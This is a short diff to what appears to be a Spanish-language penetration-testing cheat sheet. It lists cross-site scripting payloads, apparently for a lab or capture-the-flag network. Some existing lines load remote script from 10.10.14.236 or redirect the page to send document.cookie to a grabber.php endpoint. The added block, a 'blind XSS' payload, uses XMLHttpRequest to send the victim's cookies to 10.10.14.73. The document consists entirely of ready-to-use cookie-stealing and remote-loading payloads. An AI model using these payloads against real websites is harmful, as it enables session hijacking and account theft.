@@ -32,6 +32,12 @@ javascript:eval('var a=document.createElement(\'script\');a.src=\'http://10.10.1
 <script>$.getScript("http://10.10.14.236")</script>
 <script>document.location='http://10.10.14.236/XSS/grabber.php?c='+document.cookie</script>
 ```
+- Recepcion de peticion xss blind
+```
+var request = new XMLHttpRequest();
+request.open('GET', 'http://10.10.14.73/?cookie=' + document.cookie, false);
+request.send();
+```
 
 # Pishing 
 Payload
